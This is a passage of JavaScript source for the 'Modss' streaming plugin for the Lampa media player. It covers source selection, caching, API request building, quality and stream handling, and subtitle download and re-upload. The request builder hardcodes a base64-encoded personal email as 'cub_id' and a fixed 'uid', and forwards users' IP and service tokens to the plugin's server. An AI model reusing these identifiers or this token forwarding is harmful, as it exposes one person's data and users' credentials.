    var plst = Lampa.PlayerPanel.render().find('.player-panel__playlist').html();
    Lampa.Player.callback(function (e) {
      Lampa.Player.render().find('.player-panel__playlist').html(plst);
      Lampa.Player.playlist([]);
      Lampa.Controller.toggle('content');
    });
    
    Lampa.PlayerPanel.listener.follow('visible', _this.handlePlaylistIcon);
    Lampa.PlayerPlaylist.listener.follow('select', _this.callLoadedInf);
    Lampa.PlayerPanel.listener.follow('flow', _this.changeQuality);

    filter.onSearch = function (value) {
      Lampa.Activity.replace({
        search: value,
        clarification: true
      });
    };
    filter.onBack = function () {
      _this.start();
    };
    filter.render().find('.selector').on('hover:enter', function () {
      clearInterval(balanser_timer);
    });
    filter.render().find('.filter--search').appendTo(filter.render().find('.torrent-filter'));
    filter.onSelect = function (type, a, b) {
      if (a.bal) {
        filter.render().find('.filter--sort').trigger('hover:enter');
      } else if (type == 'filter') {
        var reset = function reset() {
          _this.replaceChoice({
            season: 0,
            voice: 0,
            voice_url: '',
            voice_name: ''
          });
          setTimeout(function () {
            Lampa.Select.close();
            Lampa.Activity.replace({
              clarification: 0,
              similar: 0
            });
          }, 10);
        }
        if (a.scrollTop) {
          Lampa.Select.close();
          var first = scroll.body().find('.online_modss--full.selector').first();
          if (first.length) {
            scroll.update(first, true);
            setTimeout(function () { Navigator.focus(first[0]); }, 50);
          } else {
            scroll.body().parent().scrollTop(0);
          }
          return;
        }
        if (a.reset) reset();
        else {
          if (localBal.indexOf(balanser) >= 0) {
            setTimeout(Lampa.Select.close, 10);
            return source.filter(type, a, b);
          }
          var choice = _this.getChoice();
          var url;
          if (a.stype == 'voice') {
            var seasonData = filter_find.season[choice.season];
            var season = false;

            if (seasonData) {
              if (typeof seasonData === 'object') {
                var seasonTitle = seasonData.title || seasonData.name;
                if (seasonTitle) {
                  season = parseInt(seasonTitle.split(' ')[1]);
                }
              } else {
                season = parseInt(seasonData.split(' ')[1]);
              }
            }

            if (!filter_find[a.stype][b.index]) return reset();

            url = filter_find[a.stype][b.index].url;

            if (season && url) url += '&s=' + season;
            choice.voice_name = filter_find.voice[b.index].title || filter_find.voice[b.index];
            choice.voice_id = filter_find.voice[b.index].id;
            choice.voice_url = url;
          }
          if (a.stype == 'season' && filter_find.season[b.index]) {
            url = filter_find.season[b.index].url;

            // Проверяем доступность текущего типа видео в новом сезоне
            if (balanser === 'hdr' && extract && extract.type && extract.type.length > 0 && filter_find.type) {
              var seasonItem = filter_find.season[b.index];

              if (seasonItem && typeof seasonItem === 'string') {
                var titleParts = seasonItem.split(' ');
                var seasonNumber = titleParts.length > 1 ? titleParts[1] : titleParts[0];

                var items = extract.folder || extract.episode;
                var currentType = filter_find.type[choice.type];
                if (items && currentType && items[currentType] && !items[currentType][seasonNumber]) {
                  var availableTypes = [];
                  filter_find.type.forEach(function(type, index) {
                    if (items[type] && items[type][seasonNumber] && items[type][seasonNumber].length > 0) {
                      availableTypes.push({ type: type, index: index });
                    }
                  });
                  if (availableTypes.length > 0) choice.type = availableTypes[0].index;
                }
              }
            }
          }

          choice[a.stype] = b.index;

          _this.replaceChoice(choice, balanser);
          setTimeout(Lampa.Select.close, 10);
          //_this.loading(true);
          _this.reset();
          if ((a.stype == 'server' || a.stype == 'type') && balanser == 'kinopub') {
            if (a.stype == 'server') Lampa.Storage.set('pub_server', b.index);
            if (a.stype == 'type') Lampa.Storage.set('pub_type_striming', b.index);
            _this.initialize();
          } else if (url) {
            _this.request(_this.requestParams(url));
          } else _this.parse(extract);
        }
      } else if (type == 'sort') {
        if (a.ghost) {
          Lampa.Noty.show(Lampa.Lang.translate('online_vip_available'));
          setTimeout(function () {
            var filtr = Lampa.Activity.active().activity.render().find('.filter--sort');
            Lampa.Controller.toggle('content');
            Navigator.focus(filtr[0]);
          }, 50)
        } else {
          Modss.getIp(balanser);
          Lampa.Select.close();
          object.modss_custom_select = a.source;
          _this.changeBalanser(a.source);
        }
      }
      if (show_filter) filter.render().find('.filter--filter').show(); else filter.render().find('.filter--filter').hide();
    };

    if (show_filter) filter.render().find('.filter--filter').show(); else filter.render().find('.filter--filter').hide();

    filter.render().find('.filter--sort').on('hover:enter', function () {
      $('body').find('.selectbox__title').text(Lampa.Lang.translate('modss_balanser'));
    });
    if (filter.addButtonBack && !$('.filter--back').length) filter.addButtonBack();
    filter.render().find('.filter--sort span').text(Lampa.Lang.translate('modss_balanser'));
    scroll.body().addClass('torrent-list');


    files.appendFiles(scroll.render());
    files.appendHead(filter.render());
    scroll.minus(files.render().find('.explorer__files-head'));
    scroll.body().append(Lampa.Template.get('modss_content_loading'));
    Lampa.Controller.enable('content');
    this.loading(false);

    this.createSource().then(function (wait) {
      if (!window.filmix) {
        window.filmix = {
          max_qualitie: 480,
          is_max_qualitie: false,
          auth: false,
          date: ''
        };
      }

      if (JSON.parse('["alloha","aniliberty","dreamerscast","eneida","fxpro","filmix","hdrezka","hdr","iremux","kinopub","kinotochka","mango","starlight","uaflix"]').indexOf((balanser.indexOf('<') == - 1 ? balanser.toLowerCase() : balanser.split('<')[0].toLowerCase())) == -1) {
        filter.render().find('.filter--search').addClass('hide');
      }

      _this.search();
    })["catch"](function (e) {
      if (e.vip) return _this.noConnectToServer(e);
      if (e && !e.find) {
        console.log('Modss', 'init', 'Error', e);
        Lampa.Noty.show('MODSs ОШИБКА ОНЛАЙН [init] -> ' + (e.message && e.message || e.decode_error || e.error));
        files.appendHead(filter.render());
        _this.empty();
        _this.activity.loader(false);
      } else _this.noConnectToServer(e);
    });
  };
  this.updateBalanser = function (balanser_name) {
    var last_select_balanser = Lampa.Storage.cache('online_last_balanser', 3000, {});
    last_select_balanser[object.movie.id] = balanser_name;
    Lampa.Storage.set('online_last_balanser', last_select_balanser);
  };
  this.changeBalanser = function (balanser_name) {
    var _this = this;
    this.updateBalanser(balanser_name);
    Lampa.Storage.set('online_balanser', balanser_name);
    var to = this.getChoice(balanser_name);
    var from = this.getChoice();
    if (from.voice_name) to.voice_name = from.voice_name;
    this.saveChoice(to, balanser_name);
    
    // Если есть кешированные источники, используем их вместо полной перезагрузки
    if (sourcesCache && sourcesData && filterSources && (Date.now() - sourcesCacheTime) < CACHE_LIFETIME) {
      balanser = balanser_name;
      
      // Переустанавливаем источники из кеша
      _this.setupSourcesFromCache().then(function() {
        _this.reset();
        //_this.loading(true);
        _this.search();
      }).catch(function(e) {
        console.log('Modss', 'Cache setup failed, doing full reload', e);
        Lampa.Activity.replace();
      });
    } else Lampa.Activity.replace();
  };
  this.requestParams = function (url) {
    var query = [];
    query.push('id=' + object.movie.id);
    query.push('title=' + encodeURIComponent(object.clarification ? object.search : object.movie.title || object.movie.name));
    query.push('original_title=' + encodeURIComponent(object.movie.original_title || object.movie.original_name));
    query.push('alt_name=' + this.getNames(object.movie));
    if (object.movie.imdb_id) query.push('imdb_id=' + (object.movie.imdb_id || ''));
    if (object.movie.kinopoisk_id || object.movie.kinopoisk_ID) query.push('kinopoisk_id=' + (object.movie.kinopoisk_id || object.movie.kinopoisk_ID || ''));
    query.push('serial=' + ((object.movie.name || object.movie.number_of_episodes) ? 1 : 0));
    query.push('original_language=' + (object.movie.original_language || ''));
    query.push('year=' + ((object.movie.first_air_date || object.movie.release_date || '0000') + '').slice(0, 4));
    query.push('source=' + object.movie.source);
    query.push('clarification=' + (object.clarification ? 1 : 0));
    query.push('logged=' + logged);
    query.push('vers=' + '3.4');
    query.push('prefer_dash=' + (Lampa.Storage.field('online_dash') === true));
    query.push('ip=' + IP);
    //query.push('server=' + Lampa.Storage.field('pub_server', 1));
    //query.push('hevc=' + Lampa.Storage.field('online_hevc', true));
    //query.push('type=' + this.getChoice(balanser).type);
    query.push('pro_pub=' + Lampa.Storage.get('pro_pub', 'false'));
    query.push('filmix_log=' + Lampa.Storage.get('filmix_log', 'false'));
    //if(Lampa.Storage.get('pro_pub', false)) 
    query.push('ptoken=' + Pub.token);
    if (Filmix.token && Filmix.token.indexOf('aaaabbb') == -1) query.push('token=' + Filmix.token);
    query.push('cub_id=emFlYmFsbzkxQGdtYWlsLmNvbQ==');
    query.push('uid=bb04b81f6297b1b6280ea8273_142486046');
    if (cards) {
      var notices = Lampa.Storage.get('account_notice', []).filter(function (n) {
        return n.card_id == cards.id;
      });
      if (notices.length) {
        var notice = notices.find(function (itm) {
          return Lampa.Utils.parseTime(itm.date).full == Lampa.Utils.parseTime(Date.now()).full;
        });
        if (notice) {
          query.push('s=' + notice.season);
          query.push('ep=' + notice.episode);
        }
      }
    }
    return url + (url.indexOf('?') >= 0 ? '&' : '?') + query.join('&');
  };
  this.getNames = function (data) {
    if (!data.names) return null;
    var normalizeString = function normalizeString(str) {
      return str.toLowerCase().replace(/[*-\:\.\,]/g, ' ').replace(/\s+/g, ' ').trim();
    }
    
    // Нормализуем оригинальные названия
    var normalizedOriginal = normalizeString(data.original_title || data.original_name);
    var normalizedTitle = normalizeString(data.title || data.name);
    
    // Фильтруем массив, сравнивая нормализованные строки
    var filteredNames = data.names.filter(function(name) {
      var normalizedName = normalizeString(name);
      return normalizedName !== normalizedOriginal && normalizedName !== normalizedTitle;
    });
    
    return filteredNames.length > 0 ? encodeURIComponent(filteredNames[0]) : null;
  };
  this.getLastChoiceBalanser = function () {
    var last_select_balanser = Lampa.Storage.cache('online_last_balanser', 3000, {});
    var priority_balanser = Lampa.Storage.get('priority_balanser', Modss.balansPrf);
    if (priority_balanser == undefined) priority_balanser = Modss.balansPrf;
    if (last_select_balanser[object.movie.id]) {
      return last_select_balanser[object.movie.id];
    } else {
      return priority_balanser ? priority_balanser : filter_sources.length ? filter_sources[0] : '';
    }
  };
  this.BalLocal = function (sources) {
    var locSources = {
      /*videocdn: {
          url: false,
          class: videocdn,
          name: 'VideoCDN',
          vip: false,
          show: true,
          disabled: true
      },
      cdnmovies: {
          url: false,
          class: cdnmovies,
          name: 'CDNMovies',
          vip: false,
          show: true,
          disabled: true
      },
      rezka:{
        url: false,
        class: rezka,
        name: 'Voidboost',
        vip: false,
        show: true
      }*/
    };
    var combinedSources = Object.assign({}, locSources, sources);
    for (var key in combinedSources) {
      if (combinedSources[key].disabled) {
        delete combinedSources[key];
      }
    }

    return combinedSources;
  };
  this.updateSourcesFilter = function () {
    filter.set('sort', filter_sources.map(function (e) {
      return {
        title: sources[e].name,
        source: e,
        selected: e == balanser,
        ghost: sources[e].vip
      };
    }).sort(function (a, b) {
      return a.ghost - b.ghost;
    }));
    filter.chosen('sort', [sources[balanser] ? sources[balanser].name.split(' ')[0] : balanser]);
  };
  this.setupSourcesFromCache = function () {
    var _this = this;
    return new Promise(function (resolve, reject) {
      if (!sourcesCache || !sourcesData || !filterSources) {
        return reject('No cache available');
      }
      
      console.log('Modss', 'Setup sources from cache:', balanser);
      
      // Восстанавливаем данные источников
      filter_find = {
        season: [],
        voice: [],
        type: [],
        server: []
      };
      sources = JSON.parse(JSON.stringify(sourcesData)); // глубокая копия
      filter_sources = filterSources.slice(); // копия массива
      
      // Устанавливаем URL источника для текущего балансера
      if (sources[balanser]) {
        source = sources[balanser].url;
      } else {
        // Если балансер не найден, используем первый доступный
        if (filter_sources.length > 0) {
          balanser = filter_sources[0];
          source = sources[balanser].url;
        }
      }
      
      // Обновляем фильтр источников
      _this.updateSourcesFilter();
      
      resolve(sourcesCache);
    });
  };
  this.startSource = function (json) {
    return new Promise(function (resolve, reject) {
      json.balanser.forEach(function (j) {
        var name = j.name.toLowerCase();
        sources[j.name] = {
          url: j.url,
          name: j.title,
          vip: j.vip,
          show: typeof j.show == 'undefined' ? true : j.show
        };
      });

      sources = _self.BalLocal(sources);
      filter_sources = Lampa.Arrays.getKeys(sources);
      if (filter_sources.length) {
        var priority_balanser = Lampa.Storage.get('priority_balanser', Modss.balansPrf);
        if (priority_balanser == undefined) priority_balanser = Modss.balansPrf;

        var last_select_balanser = Lampa.Storage.cache('online_last_balanser', 3000, {});
        if (last_select_balanser[object.movie.id]) {
          balanser = last_select_balanser[object.movie.id];
        } else {
          balanser = priority_balanser;//Lampa.Storage.get('online_balanser', priority_balanser);
        }

        if (!sources[balanser]) balanser = priority_balanser;
        if (!sources[balanser]) balanser = filter_sources[0];
        if (!sources[balanser].show && !object.modss_custom_select) balanser = filter_sources[0];
        source = sources[balanser].url;
        
        // Сохраняем данные источников в кеш
        sourcesData = JSON.parse(JSON.stringify(sources));
        filterSources = filter_sources.slice();
        
        resolve('Loaded - ' + object.search + ' _ ' + json.time);
      } else {
        reject();
      }
    });
  };
  this.lifeSource = function () {
    var _this2 = this;
    return new Promise(function (resolve, reject) {
      var url = _this2.requestParams(API + 'life');
      var red = false;
      var gou = function gou(json, any) {
        var last_balanser = _this2.getLastChoiceBalanser();
        if (!red) {
          var _filter = json.online.filter(function (c) {
            return any ? c.show : c.show && (c.name == last_balanser);
          });
          if (_filter.length) {
            red = true;
            resolve({
              balanser: json.online.filter(function (c) {
                return c.show;
              }),
              time: json.load.search
            });
          } else if (any) {
            reject('Not found - ' + object.search + ' _ ' + json.load.search);
          }
        }
      };
      var fin = function fin(call) {
        network.timeout(10000);
        network.silent(url, function (json) {
          if (json.FindVoice) {
            if (cards) {
              var notices = Lampa.Storage.get('account_notice', []).filter(function (n) {
                return n.card_id == cards.id;
              });
              if (notices.length) {
                var notice = notices.find(function (itm) {
                  return Lampa.Utils.parseTime(itm.date).full == Lampa.Utils.parseTime(Date.now()).full;
                });
                if (notice) {
                  notice.find = json.FindVoice;
                  Modss.Notice(notice);
                }
              }
            }
          }
          life_wait_times++;
          filter_sources = [];
          sources = {};
          json.online.forEach(function (j) {
            var name = j.name.toLowerCase();
            if (j.show) sources[j.name] = {
              url: j.url,
              name: j.title,
              vip: j.vip,
              show: typeof j.show == 'undefined' ? true : j.show
            };
          });

          sources = _this2.BalLocal(sources);

          filter_sources = Lampa.Arrays.getKeys(sources);
          
          // Сохраняем данные источников в кеш
          sourcesData = JSON.parse(JSON.stringify(sources)); // глубокая копия
          filterSources = filter_sources.slice(); // копия массива
          
          _this2.updateSourcesFilter();

          gou(json);
          if (life_wait_times > 15 || json.ready) {
            filter.render().find('.modss-balanser-loader').remove();
            gou(json, true);
          } else {
            life_wait_timer = setTimeout(fin, 1000);
          }
        }, function (e) {
          life_wait_times++;
          if (life_wait_times > 15) {
            reject();
          } else {
            if (e.statusText == 'timeout') return reject({ error: 'timeout - ' + object.search });
            life_wait_timer = setTimeout(fin, 1000);
          }
        });
      };
      fin();
    });
  };
  this.createSource = function (load) {
    var _this3 = this;
    return new Promise(function (resolve, reject) {
      // Проверяем кеш
      var now = Date.now();
      if (sourcesCache && sourcesData && filterSources && (now - sourcesCacheTime) < CACHE_LIFETIME) {
        return resolve(sourcesCache);
      }
      
      var url = _this3.requestParams(API + 'events');
      network.timeout(15000);
      network.silent(url, function (json) {
        if (json.vers && typeof version_modss !== 'undefined' && json.vers !== version_modss) {
          window.location.reload();
          return;
        }
        if (json.vip || json.error) return reject(json);
        if (json.life) {

          filter.render().find('.filter--sort').append('<span class="modss-balanser-loader" style="width: 1.2em; height: 1.2em; margin-top: 0; background: url(./img/loader.svg) no-repeat 50% 50%; background-size: contain; margin-left: 0.5em"></span>');
          _this3.lifeSource().then(_this3.startSource).then(function(result) {
            // Кешируем результат
            sourcesCache = result;
            sourcesCacheTime = now;
            resolve(result);
          })["catch"](reject);

        } else {
          _this3.startSource(json).then(function(result) {
            // Кешируем результат
            sourcesCache = result;
            sourcesCacheTime = now;
            resolve(result);
          })["catch"](reject);
        }
      }, reject);
    });
  };
  this.create = function () {
    return this.render();
  };
  this.search = function () {
    //this.loading(true);
    this.filter({
      source: filter_sources
    }, this.getChoice());
    this.find();
  };
  this.find = function () {
    if (source) this.request(this.requestParams(source));
    else {
      var kp_id = +object.movie.kinopoisk_id || +object.movie.kinopoisk_ID;
      try {
        source = new sources[balanser].class(this, object);

        if (localBal.indexOf(balanser) >= 0 && source) {
          if (source.searchByImdbID && object.movie.imdb_id) {
            source.searchByImdbID(object, object.movie.imdb_id);
          } else if (source.searchByKinopoisk && kp_id) {
            source.searchByKinopoisk(object, kp_id);
          } else if (source.searchByTitle) {
            source.searchByTitle(object, object.search);
          } else if (source.searchs) {
            source.searchs(object, kp_id || object.movie.imdb_id);
          } else this.doesNotAnswer();
          
        } else {
          this.doesNotAnswer();
        }
      } catch (error) {
        console.error('Modss', 'source error:', balanser, kp_id, error);
        this.doesNotAnswer();
      }
    }
  };
  this.request = function (url) {
    number_of_requests++;
    if (number_of_requests < 10) {
      last_request_url = url;
      network["native"](url, this.parse.bind(this), this.doesNotAnswer.bind(this), false, {
        dataType: 'json'
      });
      clearTimeout(number_of_requests_timer);
      number_of_requests_timer = setTimeout(function () {
        number_of_requests = 0;
      }, 5000);
    } else this.empty();
  };
  this.toPlayElement = function (file) {
    var rawQuality = file.qualitys || file.quality;
    var rawQualityReserve = file.quality_reserve;
    var play = {
      title: (file.isSeries) ? '[S' + file.season + ':E' + file.episode + '] ' + file.title : file.title,
      url: file.url,
      url_reserve: file.url_reserve,
      quality: rawQuality ? this.convertQualityToFormat(rawQuality) : undefined,
      quality_reserve: rawQualityReserve ? this.convertQualityToFormat(rawQualityReserve) : undefined,
      season: file.season || 0,
      episode: file.episode || 0,
      voice_name: file.voice_name || file.title || '',
      timeline: file.timeline,
      subtitles: file.subtitles,
      translate: {
        tracks: file.audio_tracks,
        subs: file.subs_tracks
      },
      callback: file.mark,
      thumbnail: file.thumbnail|| null,
      error: function (play_item, callback) {
        Lampa.Player.timecodeRecording(false);
        if (!file.stream) callback(file.url_reserve ? file.url_reserve : API.replace('api.', '') + 'not_video.mp4');
      },
      /*voiceovers: [{
          name: 'дубляж',selected: false,
        },{
          name: 'оригинал',selected: false,
        }]
      */
    };
    return play;
  };
  this.checkHashR = function (params) {
    console.log('Modss', 'checkHash:', balanser, object.search + ' - ', params.title || params.url || 'unknown')
    var _this = this;
    return new Promise(function (resolve, reject) {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', params.url, true);
      xhr.timeout = 2000;
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 2) {
          if (xhr.status >= 200 && xhr.status < 300) {
            console.log('Modss', 'checkHash', ' - OK', xhr.status);
            resolve(params);
          } else if (xhr.status >= 300 && xhr.status < 400) {
            var redirectUrl = xhr.getResponseHeader('Location');
            if (redirectUrl) {
              console.log('Modss', 'checkHash redirect:', redirectUrl);
              _this.checkHashR(redirectUrl).then(resolve).catch(reject);
            } else {
              console.log('Modss', 'checkHash redirect - ERROR:', xhr.status);
              reject(Lampa.Lang.translate('error_prefix') + xhr.status);
            }
          } else {
            console.log('Modss', 'checkHash - ERROR:', xhr.status);
            reject(Lampa.Lang.translate('error_prefix') + xhr.status);
          }
          xhr.abort();
        }
      };
      xhr.ontimeout = function () {
        params.url = params.url_reserve;
        params.qualitys = params.quality_reserve;

        console.log('Modss', 'checkHash: ', balanser, ' - play reserve_url > ', params.url_reserve || 'no reserve');
        resolve(params);
      };
      xhr.onerror = function (e) {
        console.log('Modss', 'Error', balanser, 'checkHash status:', xhr.status, e)
        reject(Lampa.Lang.translate('error_occurred'));
      };
      xhr.send(null);
    });
  };
  this.setDefaultQuality = function (data) {
    if (Lampa.Arrays.getKeys(data.quality).length) {
      for (var q in data.quality) {
        if (parseInt(q) == Lampa.Storage.field('video_quality_default')) {
          var qualityData = data.quality[q];
          data.url = (qualityData && qualityData.url) ? qualityData.url : data.quality[q];
          break;
        }
      }
    }
  };
  this.getSelectedQuality = function(playData) {
    if (!playData || !playData.quality) return null;
    
    var selectedUrl = playData.url;
    if (!selectedUrl) return null;
    
    var useReserve = playData.url_reserve && selectedUrl === playData.url_reserve;
    var qualitySource = useReserve && playData.quality_reserve ? playData.quality_reserve : playData.quality;
    
    for (var quality in qualitySource) {
      var qualityUrl = qualitySource[quality];
      if (typeof qualityUrl === 'string' && qualityUrl === selectedUrl) {
        return {
          quality: quality,
          url: qualityUrl,
          isReserve: useReserve
        };
      }
      if (typeof qualityUrl === 'object' && qualityUrl.url === selectedUrl) {
        return {
          quality: quality,
          url: qualityUrl.url,
          reserve: qualityUrl.reserve || [],
          isReserve: useReserve
        };
      }
    }
    
    return null;
  };
  this.setFlowsForQuality = function(playData) {
    if (!playData) return;
    
    var flows = [];
    var urls = [];
    var selectedUrl = playData.url;
    
    if (playData.quality && playData.quality_reserve) {
      var selectedQuality = this.getSelectedQuality(playData);
      if (!selectedQuality) return;
      
      var qualityKey = selectedQuality.quality;
      var mainQualityData = playData.quality[qualityKey];
      var reserveQualityData = playData.quality_reserve[qualityKey];
      
      if (!mainQualityData && !reserveQualityData) return;
      
      var mainUrl = mainQualityData ? (typeof mainQualityData === 'string' ? mainQualityData : mainQualityData.url) : null;
      var reserveUrl = reserveQualityData ? (typeof reserveQualityData === 'string' ? reserveQualityData : reserveQualityData.url) : null;
      
      var currentUrl = playData.url;
      
      if (mainUrl && reserveUrl && mainUrl !== reserveUrl) {
        urls = [mainUrl, reserveUrl];
        
        if (currentUrl === mainUrl) {
          selectedUrl = mainUrl;
        } else if (currentUrl === reserveUrl) {
          selectedUrl = reserveUrl;
        } else {
          selectedUrl = mainUrl;
        }
      } else if (mainUrl) {
        urls = [mainUrl];
        if (reserveUrl && reserveUrl !== mainUrl) {
          urls.push(reserveUrl);
        }
        selectedUrl = mainUrl;
      } else if (reserveUrl) {
        urls = [reserveUrl];
        selectedUrl = reserveUrl;
      }
      
      var additionalReserveUrls = [];
      if (typeof mainQualityData === 'object' && mainQualityData.reserve) {
        additionalReserveUrls = additionalReserveUrls.concat(mainQualityData.reserve);
      }
      if (typeof reserveQualityData === 'object' && reserveQualityData.reserve) {
        additionalReserveUrls = additionalReserveUrls.concat(reserveQualityData.reserve);
      }
      
      if (additionalReserveUrls.length > 0) {
        urls = urls.concat(additionalReserveUrls.filter(function(url) {
          return url && urls.indexOf(url) === -1;
        }));
      }
    } else if (playData.url || playData.url_reserve) {
      var reserveUrlsSimple = playData.url_reserve ? [playData.url_reserve] : [];
      urls = [playData.url].concat(reserveUrlsSimple.filter(function(url) {
        return url && url !== playData.url;
      }));
      selectedUrl = playData.url;
    }
    
    if (urls.length > 1) {
      urls.forEach(function(url, index) {
        flows.push({
          title: Lampa.Lang.translate('stream_prefix') + (index + 1),
          subtitle: Lampa.Utils.shortText(url, 35),
          url: url,
          selected: url === selectedUrl
        });
      });
      
      Lampa.PlayerPanel.setFlows(flows);
    }
  };
  this.setFlowsForItem = function(item) {
    if (item.quality && item.quality_reserve) {
      this.setFlowsForQuality({
        url: item.url,
        url_reserve: item.url_reserve,
        quality: item.quality,
        quality_reserve: item.quality_reserve
      });
    } else {
      this.setFlowsForQuality({
        url: item.url,
        url_reserve: item.url_reserve
      });
    }
  };
  this.convertQualityToFormat = function(qualityObj) {
    var _this = this;
    if (!qualityObj || !Lampa.Arrays.isObject(qualityObj)) return undefined;
    
    var converted = {};
    for (var quality in qualityObj) {
      var qualityValue = qualityObj[quality];
      
      // Уже в "правильном" формате
      if (qualityValue && typeof qualityValue === 'object' && !Lampa.Arrays.isArray(qualityValue) && (qualityValue.url || qualityValue.reserve)) {
        var existingReserve = Lampa.Arrays.isArray(qualityValue.reserve)
          ? qualityValue.reserve
          : (qualityValue.reserve ? [qualityValue.reserve] : []);
        
        converted[quality] = {
          label: typeof qualityValue.label === 'string' ? qualityValue.label : '',
          url: qualityValue.url,
          reserve: existingReserve,
          used: Lampa.Arrays.isArray(qualityValue.used) ? qualityValue.used : [],
          error: Lampa.Arrays.isArray(qualityValue.error) ? qualityValue.error : [],
          trigger: typeof qualityValue.trigger === 'function' ? qualityValue.trigger : function() {
            _this.setFlowsForQuality(Lampa.Player.playdata());
          }
        };
        
        // Если url отсутствует, но есть reserve — попробуем взять первый
        if (!converted[quality].url && converted[quality].reserve.length) {
          converted[quality].url = converted[quality].reserve[0];
          converted[quality].reserve = converted[quality].reserve.slice(1);
        }
        
        if (converted[quality].url) continue;
        delete converted[quality];
      }
      
      var intQuality = parseInt(quality);
      var qualityLabel = '';
      if (intQuality > 1440) {
        qualityLabel = '4K';
      } else if (intQuality >= 1440) {
        qualityLabel = '2K';
      } else if (intQuality >= 1080) {
        qualityLabel = 'FHD';
      } else if (intQuality >= 720) {
        qualityLabel = 'HD';
      }
      
      var links = [];
      if (Lampa.Arrays.isArray(qualityValue)) {
        links = qualityValue.filter(function(url) { return !!url; });
      } else if (typeof qualityValue === 'string') {
        links = [qualityValue];
      } else if (qualityValue && typeof qualityValue === 'object' && typeof qualityValue.url === 'string') {
        links = [qualityValue.url].concat(
          Lampa.Arrays.isArray(qualityValue.reserve) ? qualityValue.reserve : []
        ).filter(function(url) { return !!url; });
        
        if (typeof qualityValue.label === 'string' && qualityValue.label) {
          qualityLabel = qualityValue.label;
        }
      }
      
      if (!links.length) continue;
      
      converted[quality] = {
        label: qualityLabel,
        url: links[0],
        reserve: links.length > 1 ? links.slice(1) : [],
        used: [],
        error: [],
        trigger: function() {
          _this.setFlowsForQuality(Lampa.Player.playdata());
        }
      };
    }
    
    return Lampa.Arrays.getKeys(converted).length ? converted : undefined;
  };
  this.downloadAndUploadArchive = function (url, id, imdb, season, episode, lang) {
    return new Promise(function (resolve, reject) {
      var retryAttempt = false;
      var downloadFromUrl = function (downloadUrl) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', downloadUrl, true);
        xhr.responseType = 'blob';
        xhr.onload = function () {
          if (xhr.status === 200) {
            var blob = xhr.response;
            var formData = new FormData();
            formData.append('file', blob, 'temp.zip');
            formData.append('id', id);
            formData.append('imdb', imdb);
            formData.append('season', season);
            formData.append('episode', episode);
            formData.append('lang', lang);

            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', API + 'subsLoad', true);
            xhr2.onload = function () {
              if (xhr2.status === 200) {
                resolve(JSON.parse(xhr2.responseText));
              } else {
                reject(new Error(Lampa.Lang.translate('error_file_send') + xhr2.status + ' - ' + xhr2.statusText));
              }
            };
            xhr2.onerror = function () {
              reject(new Error(Lampa.Lang.translate('error_file_send_simple')));
            };
            xhr2.send(formData);
          } else if (xhr.status === 404) {
            reject(new Error(Lampa.Lang.translate('error_archive_load') + xhr.status + ' - ' + xhr.statusText));
          }
        };
        xhr.onerror = function (e) {
          if (xhr.status === 0 && !retryAttempt) {
            retryAttempt = true;
            console.log('Modss', 'loadedZIP', 'retry');
            if (url) downloadFromUrl(url.replace('https://www.opensubtitles.org/download/s/', 'https://www.opensubtitles.org/ru/download/s/').replace('https://www.opensubtitles.org/ru/subtitleserve/sub/', 'https://dl.opensubtitles.org/ru/download/sub/')); else reject(new Error(Lampa.Lang.translate('error_archive_url_empty')));
          } else reject(new Error(Lampa.Lang.translate('error_archive_load_simple')));
        };
        xhr.send();
      };
      downloadFromUrl(url);
    });
  };
  this.downloadAndUploadArchiveV3 = function (url, id, imdb, season, episode, lang) {
    return new Promise(function (resolve, reject) {
      if (!url) {
        reject(new Error('V3: URL не должен быть пустой'));
        return;
      }
      
      var xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.responseType = 'blob';
      xhr.timeout = 30000; // 30 секунд таймаут
      
      xhr.onload = function () {
        if (xhr.status === 200) {
          var blob = xhr.response;
          
          // Проверяем размер файла
          if (blob.size === 0) {
            reject(new Error('V3: Файл пустой'));
            return;
          }
          
          var formData = new FormData();
          formData.append('file', blob, 'subtitle.zip');
          formData.append('id', id);
          formData.append('imdb', imdb);
          formData.append('season', season || 'null');
          formData.append('episode', episode || 'null');
          formData.append('lang', lang || 'null');

          var xhr2 = new XMLHttpRequest();
          xhr2.open('POST', API + 'subsLoad', true);
          xhr2.timeout = 30000;
          
          xhr2.onload = function () {
            if (xhr2.status === 200) {
              try {
                var response = JSON.parse(xhr2.responseText);
                resolve(response);
              } catch (e) {
                reject(new Error('V3: Ошибка парсинга ответа: ' + e.message));
              }
            } else {
              reject(new Error('V3: Ошибка при отправке файла: ' + xhr2.status + ' - ' + xhr2.statusText));
            }
          };
          
          xhr2.onerror = function () {
            reject(new Error('V3: Ошибка сети при отправке файла'));
          };
          
          xhr2.ontimeout = function () {
            reject(new Error('V3: Таймаут при отправке файла'));
          };
          
          xhr2.send(formData);
        } else {
          reject(new Error('V3: Ошибка загрузки: ' + xhr.status + ' - ' + xhr.statusText));
        }
      };
      
      xhr.onerror = function () {
        reject(new Error('V3: Ошибка сети при загрузке'));
      };
      
      xhr.ontimeout = function () {
        reject(new Error('V3: Таймаут при загрузке'));
      };
      
      xhr.send();
    });
  };
  this.handlePlaylistIcon = function () {
    if (Lampa.Player.opened() && Lampa.Activity.active().component == 'modss_online') {
      var playdata = Lampa.Player.playdata();
      if (!playdata) return;
      
      var hasPlaylist = playdata.playlist && Lampa.Arrays.isArray(playdata.playlist) && playdata.playlist.length > 1;
      var isSeries = playdata.isSeries !== undefined ? playdata.isSeries : (playdata.episode > 0 || (hasPlaylist && playdata.playlist.some(function (item) { return !item.separator && item.episode > 0; })));
      if (!isSeries && hasPlaylist) {
        if (Lampa.PlayerPanel.visibleStatus()) {
          Lampa.PlayerPanel.render().find('.player-panel__playlist').html(Lampa.PlayerPanel.render().find('.player-panel__tracks').html());
        }
      }
    }
  };
  this.callLoadedInf = function (e) {
    if(e && e.item && e.item.callLoadedInf) e.item.callLoadedInf();
  };
  this.changeQuality = function (params) {
    if (!params || !params.url || !currentPlayItem) return;
    
    var useReserve = currentPlayItem.url_reserve && params.url === currentPlayItem.url_reserve;
    var quality = useReserve && currentPlayItem.quality_reserve 
      ? currentPlayItem.quality_reserve 
      : currentPlayItem.quality;
    
    if (quality) {
      var convertedQuality = _self.convertQualityToFormat(quality);
      Lampa.PlayerPanel.quality(convertedQuality, params.url);
      
      var playData = Lampa.Player.playdata();
      if (playData) {
